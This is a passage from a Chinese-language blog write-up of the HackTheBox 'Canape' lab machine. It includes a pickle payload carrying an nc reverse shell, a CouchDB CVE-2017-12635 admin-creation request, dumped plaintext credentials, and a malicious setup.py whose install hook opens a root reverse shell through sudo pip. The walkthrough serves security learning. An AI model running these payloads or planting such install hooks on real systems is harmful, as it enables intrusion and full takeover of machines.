+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># python2 payload.py 10.10.16.9 4443</span><br>[*] Filename will be: d9ea1f56d0d9040d3a1b0cf1433ba478<br>[*] Exploit:<br>cposix<br>system<br>p1<br>(S<span class="hljs-string">&#x27;echo moe &amp;&amp; rm /tmp/0xdf; mkfifo /tmp/0xdf; cat /tmp/0xdf | /bin/sh -i 2&gt;&amp;1 | nc 10.10.16.9 4443 &gt; /tmp/0xdf&#x27;</span><br>tRp2<br>.<br>[+] Sending exploit...<br>[+] Exploit successfully submitted<br>[+] Triggering exploit with /check, <span class="hljs-built_in">id</span> = d9ea1f56d0d9040d3a1b0cf1433ba478<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">─<span class="hljs-comment"># nc -lvnp 4443                                    </span><br>listening on [any] 4443 ...<br>connect to [10.10.16.9] from (UNKNOWN) [10.10.10.70] 37982<br>/bin/sh: 0: can<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ whoami</span><br><span class="hljs-string">www-data</span><br><span class="hljs-string">$ </span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>介于目标机器上存有couchdb，我觉得像是作者安排的提权路线为基于couchdb提权，那么我可以搜寻一下相关漏洞：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit couchdb<br>-------------------------------------------------------- ---------------------------------<br> Exploit Title                                          |  Path<br>-------------------------------------------------------- ---------------------------------<br>Apache CouchDB - Arbitrary Command Execution (Metasploi | linux/remote/45019.rb<br>Apache CouchDB 1.5.0 - <span class="hljs-string">&#x27;uuids&#x27;</span> Denial of Service        | multiple/dos/32519.txt<br>Apache CouchDB 1.7.0 / 2.x &lt; 2.1.1 - Remote Privilege E | linux/webapps/44498.py<br>Apache CouchDB 2.0.0 - Local Privilege Escalation       | windows/local/40865.txt<br>Apache CouchDB 2.3.0 - Cross-Site Scripting             | multiple/webapps/46406.txt<br>Apache CouchDB 2.3.1 - Cross-Site Request Forgery / Cro | multiple/webapps/46595.txt<br>Apache CouchDB &lt; 2.1.0 - Remote Code Execution          | linux/webapps/44913.py<br>-------------------------------------------------------- ---------------------------------<br></code></pre></td></tr></table></figure>
+
+<p>我发现了：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Apache CouchDB 2.0.0 - Local Privilege Escalation<br></code></pre></td></tr></table></figure>
+
+<p>哦可惜他是windows，我的目标是linux，不适用。没关系还有：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Apache CouchDB 1.7.0 / 2.x &lt; 2.1.1 - Remote Privilege Escalation<br></code></pre></td></tr></table></figure>
+
+<p>哦远程升级特权，目标couchdb数据库只对内，或许我会有开启对外访问的权限或方法，或者我本地模拟一下远程，访问localhost一样可以被视为远程， 我可以看一眼漏洞利用脚本：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit -x linux/webapps/44498.py<br></code></pre></td></tr></table></figure>
+
+<p>漏洞利用脚本告诉我漏洞编号为：CVE-2017-12635。我从脚本中看不出什么来，我便搜寻了相关资料，找到了这个url：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12635<br></code></pre></td></tr></table></figure>
+
+<p>Apache CouchDB 是一个开源的面向文档的 NoSQL 数据库，用 Erlang 实现。CouchDB 使用多种格式和协议来存储、传输和处理其数据。它使用 JSON 存储数据，使用 MapReduce 作为其查询语言的 JavaScript，以及作为 API 的 HTTP。</p>
+<p>由于基于 Erlang 的 JSON 解析器和基于 JavaScript 的 JSON 解析器的差异，在 1.7.0 之前的 Apache CouchDB 和 2.1.1 之前的 2.x 中，可以提交<code>_users</code>具有重复键的文档以<code>roles</code>用于数据库内的访问控制，包括<code>_admin</code>表示管理用户的特殊情况角色。</p>
+<p>例如添加正常用户的请求是这样的：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">PUT</span> <span class="hljs-string">/_users/org.couchdb.user:vulhub</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>your-ip:5984<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>90<br><br><span class="language-prolog">&#123;</span><br><span class="language-prolog">  <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;user&quot;</span>,</span><br><span class="language-prolog">  <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;vulhub&quot;</span>,</span><br><span class="language-prolog">  <span class="hljs-string">&quot;roles&quot;</span>: [<span class="hljs-string">&quot;_admin&quot;</span>],</span><br><span class="language-prolog">  <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;vulhub&quot;</span></span><br><span class="language-prolog">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>访问限制目录会返回 403 错误：<code>&#123;&quot;error&quot;: &quot;forbidden&quot;, &quot;reason&quot;: &quot;Only _admin may set roles&quot;&#125;</code>，这意味着只有管理员可以访问限制级目录，但是可以通过发送包含重复<strong>角色</strong>的请求来绕过限制。像这样：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">PUT</span> <span class="hljs-string">/_users/org.couchdb.user:vulhub</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>your-ip:5984<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>108<br><br><span class="language-prolog">&#123;</span><br><span class="language-prolog">  <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;user&quot;</span>,</span><br><span class="language-prolog">  <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;vulhub&quot;</span>,</span><br><span class="language-prolog">  <span class="hljs-string">&quot;roles&quot;</span>: [<span class="hljs-string">&quot;_admin&quot;</span>],</span><br><span class="language-prolog">  <span class="hljs-string">&quot;roles&quot;</span>: [],</span><br><span class="language-prolog">  <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;vulhub&quot;</span></span><br><span class="language-prolog">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>就会成功创建一个用户vulhub，而且是带有密码vulhub。那么我可以利用该漏洞创建为自己创建一个管理员账户：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -X PUT -d <span class="hljs-string">&#x27;&#123;&quot;type&quot;:&quot;user&quot;,&quot;name&quot;:&quot;world&quot;,&quot;roles&quot;:[&quot;_admin&quot;],&quot;roles&quot;:[],&quot;password&quot;:&quot;world&quot;&#125;&#x27;</span> localhost:5984/_users/org.couchdb.user:world -H <span class="hljs-string">&quot;Content-Type:application/json&quot;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@canape:/$ curl -X PUT -d <span class="hljs-string">&#x27;&#123;&quot;type&quot;:&quot;user&quot;,&quot;name&quot;:&quot;world&quot;,&quot;roles&quot;:[&quot;_admin&quot;],&quot;roles&quot;:[],&quot;password&quot;:&quot;world&quot;&#125;&#x27;</span> localhost:5984/_users/org.couchdb.user:world -H <span class="hljs-string">&quot;Content-Type:application/json&quot;</span><br>&lt;_users/org.couchdb.user:world -H <span class="hljs-string">&quot;Content-Type:application/json&quot;</span>            <br>&#123;<span class="hljs-string">&quot;ok&quot;</span>:<span class="hljs-literal">true</span>,<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;org.couchdb.user:world&quot;</span>,<span class="hljs-string">&quot;rev&quot;</span>:<span class="hljs-string">&quot;1-b485f086ac0935beb3e4567583583962&quot;</span>&#125;<br>www-data@canape:/$ <br></code></pre></td></tr></table></figure>
+
+<p>我看起来像是成功了。那么我可以尝试本地访问一些数据库信息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl http://world:world@localhost:5984/passwords<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@canape:/$ curl http://world:world@localhost:5984/passwords<br>curl http://world:world@localhost:5984/passwords<br>&#123;<span class="hljs-string">&quot;db_name&quot;</span>:<span class="hljs-string">&quot;passwords&quot;</span>,<span class="hljs-string">&quot;update_seq&quot;</span>:<span class="hljs-string">&quot;46-g1AAAAFTeJzLYWBg4MhgTmEQTM4vTc5ISXLIyU9OzMnILy7JAUoxJTIkyf___z8rkR2PoiQFIJlkD1bHik-dA0hdPGF1CSB19QTV5bEASYYGIAVUOp8YtQsgavcTo_YARO39rER8AQRR-wCiFuhetiwA7ytvXA&quot;</span>,<span class="hljs-string">&quot;sizes&quot;</span>:&#123;<span class="hljs-string">&quot;file&quot;</span>:222462,<span class="hljs-string">&quot;external&quot;</span>:665,<span class="hljs-string">&quot;active&quot;</span>:1740&#125;,<span class="hljs-string">&quot;purge_seq&quot;</span>:0,<span class="hljs-string">&quot;other&quot;</span>:&#123;<span class="hljs-string">&quot;data_size&quot;</span>:665&#125;,<span class="hljs-string">&quot;doc_del_count&quot;</span>:0,<span class="hljs-string">&quot;doc_count&quot;</span>:4,<span class="hljs-string">&quot;disk_size&quot;</span>:222462,<span class="hljs-string">&quot;disk_format_version&quot;</span>:6,<span class="hljs-string">&quot;data_size&quot;</span>:1740,<span class="hljs-string">&quot;compact_running&quot;</span>:<span class="hljs-literal">false</span>,<span class="hljs-string">&quot;instance_start_time&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>&#125;<br>www-data@canape:/$ <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">5984</span><span class="hljs-regexp">/passwords/</span>_all_docs?include_docs=true -u world:world<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@canape:/$ curl http://127.0.0.1:5984/passwords/_all_docs?include_docs=<span class="hljs-literal">true</span> -u world:world<br>&lt;p://127.0.0.1:5984/passwords/_all_docs?include_docs=<span class="hljs-literal">true</span> -u world:world     <br>&#123;<span class="hljs-string">&quot;total_rows&quot;</span>:4,<span class="hljs-string">&quot;offset&quot;</span>:0,<span class="hljs-string">&quot;rows&quot;</span>:[<br>&#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;739c5ebdf3f7a001bebb8fc4380019e4&quot;</span>,<span class="hljs-string">&quot;key&quot;</span>:<span class="hljs-string">&quot;739c5ebdf3f7a001bebb8fc4380019e4&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>:&#123;<span class="hljs-string">&quot;rev&quot;</span>:<span class="hljs-string">&quot;2-81cf17b971d9229c54be92eeee723296&quot;</span>&#125;,<span class="hljs-string">&quot;doc&quot;</span>:&#123;<span class="hljs-string">&quot;_id&quot;</span>:<span class="hljs-string">&quot;739c5ebdf3f7a001bebb8fc4380019e4&quot;</span>,<span class="hljs-string">&quot;_rev&quot;</span>:<span class="hljs-string">&quot;2-81cf17b971d9229c54be92eeee723296&quot;</span>,<span class="hljs-string">&quot;item&quot;</span>:<span class="hljs-string">&quot;ssh&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;0B4jyA0xtytZi7esBNGp&quot;</span>,<span class="hljs-string">&quot;user&quot;</span>:<span class="hljs-string">&quot;&quot;</span>&#125;&#125;,<br>&#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;739c5ebdf3f7a001bebb8fc43800368d&quot;</span>,<span class="hljs-string">&quot;key&quot;</span>:<span class="hljs-string">&quot;739c5ebdf3f7a001bebb8fc43800368d&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>:&#123;<span class="hljs-string">&quot;rev&quot;</span>:<span class="hljs-string">&quot;2-43f8db6aa3b51643c9a0e21cacd92c6e&quot;</span>&#125;,<span class="hljs-string">&quot;doc&quot;</span>:&#123;<span class="hljs-string">&quot;_id&quot;</span>:<span class="hljs-string">&quot;739c5ebdf3f7a001bebb8fc43800368d&quot;</span>,<span class="hljs-string">&quot;_rev&quot;</span>:<span class="hljs-string">&quot;2-43f8db6aa3b51643c9a0e21cacd92c6e&quot;</span>,<span class="hljs-string">&quot;item&quot;</span>:<span class="hljs-string">&quot;couchdb&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;r3lax0Nth3C0UCH&quot;</span>,<span class="hljs-string">&quot;user&quot;</span>:<span class="hljs-string">&quot;couchy&quot;</span>&#125;&#125;,<br>&#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;739c5ebdf3f7a001bebb8fc438003e5f&quot;</span>,<span class="hljs-string">&quot;key&quot;</span>:<span class="hljs-string">&quot;739c5ebdf3f7a001bebb8fc438003e5f&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>:&#123;<span class="hljs-string">&quot;rev&quot;</span>:<span class="hljs-string">&quot;1-77cd0af093b96943ecb42c2e5358fe61&quot;</span>&#125;,<span class="hljs-string">&quot;doc&quot;</span>:&#123;<span class="hljs-string">&quot;_id&quot;</span>:<span class="hljs-string">&quot;739c5ebdf3f7a001bebb8fc438003e5f&quot;</span>,<span class="hljs-string">&quot;_rev&quot;</span>:<span class="hljs-string">&quot;1-77cd0af093b96943ecb42c2e5358fe61&quot;</span>,<span class="hljs-string">&quot;item&quot;</span>:<span class="hljs-string">&quot;simpsonsfanclub.com&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;h02ddjdj2k2k2&quot;</span>,<span class="hljs-string">&quot;user&quot;</span>:<span class="hljs-string">&quot;homer&quot;</span>&#125;&#125;,<br>&#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;739c5ebdf3f7a001bebb8fc438004738&quot;</span>,<span class="hljs-string">&quot;key&quot;</span>:<span class="hljs-string">&quot;739c5ebdf3f7a001bebb8fc438004738&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>:&#123;<span class="hljs-string">&quot;rev&quot;</span>:<span class="hljs-string">&quot;1-49a20010e64044ee7571b8c1b902cf8c&quot;</span>&#125;,<span class="hljs-string">&quot;doc&quot;</span>:&#123;<span class="hljs-string">&quot;_id&quot;</span>:<span class="hljs-string">&quot;739c5ebdf3f7a001bebb8fc438004738&quot;</span>,<span class="hljs-string">&quot;_rev&quot;</span>:<span class="hljs-string">&quot;1-49a20010e64044ee7571b8c1b902cf8c&quot;</span>,<span class="hljs-string">&quot;user&quot;</span>:<span class="hljs-string">&quot;homerj0121&quot;</span>,<span class="hljs-string">&quot;item&quot;</span>:<span class="hljs-string">&quot;github&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;STOP STORING YOUR PASSWORDS HERE -Admin&quot;</span>&#125;&#125;<br>]&#125;<br></code></pre></td></tr></table></figure>
+
+<p>我看到了：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-attr">&quot;item&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ssh&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;0B4jyA0xtytZi7esBNGp&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;user&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br></code></pre></td></tr></table></figure>
+
+<p>但我不知道它是哪个用户的，哦我刚刚遍历home目录中，看到过一个homer的用户名，当然我想先试试root：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh root@10.10.10.70 -p 65535         <br>The authenticity of host <span class="hljs-string">&#x27;[10.10.10.70]:65535 ([10.10.10.70]:65535)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:fnOGcxmSP9f1PLBisr/nYMZP1ilGixOYS2kCQnYynxc.</span><br><span class="hljs-string">This key is not known by any other names</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>[10.10.10.70]:65535<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">root@10.10.10.70&#x27;</span>s password: <br>Permission denied, please try again.<br>root@10.10.10.70<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Permission denied, please try again.</span><br><span class="hljs-string">root@10.10.10.70&#x27;</span>s password: <br>root@10.10.10.70: Permission denied (publickey,password).<br></code></pre></td></tr></table></figure>
+
+<p>好吧它不行，那我试试homer：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh homer@10.10.10.70 -p 65535<br>homer@10.10.10.70<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)</span><br><span class="hljs-string"></span><br><span class="hljs-string"> * Documentation:  https://help.ubuntu.com</span><br><span class="hljs-string"> * Management:     https://landscape.canonical.com</span><br><span class="hljs-string"> * Support:        https://ubuntu.com/advantage</span><br><span class="hljs-string">Last login: Tue Apr 10 12:57:08 2018 from 10.10.14.5</span><br><span class="hljs-string">homer@canape:~$ ls</span><br><span class="hljs-string">bin  data  erts-7.3  etc  lib  LICENSE  releases  share  user.txt  var</span><br><span class="hljs-string">homer@canape:~$ cat user.txt </span><br></code></pre></td></tr></table></figure>
+
+<p>它可以，并且我得到了user.txt。既然有密码那么我可以尝试一下sudo -l：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">homer@canape:~$ sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> homer: <br>Matching Defaults entries <span class="hljs-keyword">for</span> homer on canape:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User homer may run the following commands on canape:<br>    (root) /usr/bin/pip install *<br></code></pre></td></tr></table></figure>
+
+<p>它告诉我可以以root身份调用pip install 任何东西。我可以制定一个包含以下命令的setup.py:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> subprocess<br><br><span class="hljs-keyword">from</span> setuptools <span class="hljs-keyword">import</span> setup<br><span class="hljs-keyword">from</span> setuptools.command.install <span class="hljs-keyword">import</span> install<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span>(<span class="hljs-title class_ inherited__">install</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>        s.connect((<span class="hljs-string">&quot;10.10.16.9&quot;</span>,<span class="hljs-number">4444</span>))<br>        os.dup2(s.fileno(),<span class="hljs-number">0</span>)<br>        os.dup2(s.fileno(),<span class="hljs-number">1</span>)<br>        os.dup2(s.fileno(),<span class="hljs-number">2</span>)<br>        p = subprocess.call([<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-i&quot;</span>])<br><br>setup(<br>    cmdclass=&#123;<br>        <span class="hljs-string">&quot;install&quot;</span>: Exploit<br>    &#125;<br>)<br></code></pre></td></tr></table></figure>
+
+<p>靶场自带的编辑器总是那么难用，好吧，我本地编辑再通过wget给目标送过去：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -m http.server 80                                                                                              <br>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget http://10.10.16.9:80/setup.py<br></code></pre></td></tr></table></figure>
+
+<p>目标击中了：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">10.10.10.70 - - [10/Apr/2022 23:02:05] <span class="hljs-string">&quot;GET /setup.py HTTP/1.1&quot;</span> 200 -<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">homer@canape:~$ sudo pip install .<br>The directory <span class="hljs-string">&#x27;/home/homer/.cache/pip/http&#x27;</span> or its parent directory is not owned by the current user and the cache has been disabled. Please check the permissions and owner of that directory. If executing pip with sudo, you may want sudo<span class="hljs-string">&#x27;s -H flag.                                                                      </span><br><span class="hljs-string">The directory &#x27;</span>/home/homer/.cache/pip<span class="hljs-string">&#x27; or its parent directory is not owned by the current user and caching wheels has been disabled. check the permissions and owner of that directory. If executing pip with sudo, you may want sudo&#x27;</span>s -H flag.                                                                             <br>Processing /home/homer<br>Installing collected packages: UNKNOWN<br>  Running setup.py install <span class="hljs-keyword">for</span> UNKNOWN ... <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvnp 4444        <br>listening on [any] 4444 ...<br>connect to [10.10.16.9] from (UNKNOWN) [10.10.10.70] 51994<br><span class="hljs-comment"># whoami                                                                      </span><br>root                                                                          <br><span class="hljs-comment"># cat /root/root.txt </span><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/HackTheBox/" class="category-chain-item">HackTheBox</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Linux/">#Linux</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HackTheBox-Canape</div>
+      <div>http://example.com/2022/10/06/HackTheBox-Canape/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Mosaic Theory</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>October 6, 2022</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/10/06/HackTheBox-Bart/" title="HackTheBox-Bart">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HackTheBox-Bart</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/10/06/HackTheBox-Chase/" title="HackTheBox-Chase">
+                        <span class="hidden-mobile">HackTheBox-Chase</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
